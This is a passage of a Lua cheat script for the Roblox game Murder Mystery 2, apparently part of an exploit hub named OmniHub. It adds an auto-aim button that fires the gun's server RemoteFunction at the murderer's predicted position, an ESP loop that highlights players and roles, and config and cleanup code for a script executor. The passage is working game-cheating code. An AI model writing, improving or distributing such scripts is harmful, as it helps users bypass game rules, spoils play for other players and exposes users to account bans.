AimButton.Position = UDim2.new(0.897, 0, 0.3)
AimButton.Size = UDim2.new(0.1, 0, 0.2)
AimButton.Image = "rbxassetid://11162755592"
AimButton.Draggable = true
AimButton.Visible = false

local UIStroke = Instance.new("UIStroke", AimButton)
UIStroke.Color = Color3.fromRGB(255, 100, 0)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.5

AimButton.MouseButton1Click:Connect(function()
  local localPlayer = Players.LocalPlayer
  local gun = localPlayer.Character:FindFirstChild("Gun") or localPlayer.Backpack:FindFirstChild("Gun")
  
  if not gun then return end
  
  local murderer = GetMurderer()
  if not murderer then return end
  
  localPlayer.Character.Humanoid:EquipTool(gun)
  
  local predictedPos = getPredictedPosition(murderer)
  if predictedPos then
      gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, predictedPos, "AH2")
  end
end)

-- Initialize SaveManager
SaveManager:SetLibrary(Fluent)
SaveManager:SetFolder("OmniHub/MM2")
SaveManager:BuildConfigSection(Tabs.Settings)

-- Initialize InterfaceManager
InterfaceManager:SetLibrary(Fluent)
InterfaceManager:SetFolder("OmniHub")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)

-- FIX: Proper initialization sequence
local function Initialize()
    -- Setup all connections
    SetupRoleTracking()
    SetupGunTracking()
    SetupPlayerConnections()
    
    -- Start ESP update loop with proper update frequency
    local ESPUpdateConnection = RunService.RenderStepped:Connect(UpdateESP)
    
    -- FIX: Proper cleanup without using BindToClose (client-side only)
    local cleanupFunction = function()
        -- Disconnect all connections
        if RoleUpdateConnection then RoleUpdateConnection:Disconnect() end
        if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
        if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
        if ESPUpdateConnection then ESPUpdateConnection:Disconnect() end
        
        for _, conn in pairs(GunTrackingConnections) do
            conn:Disconnect()
        end
        
        -- Clean up all highlights
        for player, highlight in pairs(Highlights) do
            if highlight and highlight.Parent then
                highlight:Destroy()
            end
        end
        
        -- Remove the highlight folder
        if HighlightFolder and HighlightFolder.Parent then
            HighlightFolder:Destroy()
        end
    end
    
    -- Register cleanup function for script termination
    if getgenv then
        getgenv().ESPCleanupFunction = cleanupFunction
    end
    
    -- Success notification
    Fluent:Notify({
       Title = "Enhanced ESP Loaded",
       Content = "Improved character outlines are now active",
       Duration = 3
    })
    
    -- Load saved configuration
    SaveManager:LoadAutoloadConfig()
end

-- Start the initialization process
Initialize()
